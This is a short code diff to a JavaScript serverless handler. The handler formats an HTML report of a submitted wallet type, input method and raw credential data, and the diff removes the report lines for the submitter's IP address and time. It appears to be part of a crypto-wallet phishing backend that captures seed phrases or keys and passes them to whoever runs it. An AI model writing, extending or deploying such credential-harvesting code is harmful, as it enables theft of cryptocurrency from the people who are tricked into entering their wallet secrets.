@@ -46,8 +46,6 @@ module.exports = async (req, res) => {
                 <p><strong>Wallet Type:</strong> ${walletType}</p>
                 <p><strong>Method:</strong> ${inputMethod}</p>
                 <pre style="background:#f4f4f4; padding:10px;">${credentialData}</pre>
-                <p><strong>IP:</strong> ${ipAddress}</p>
-                <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
             </div>
         `;
 
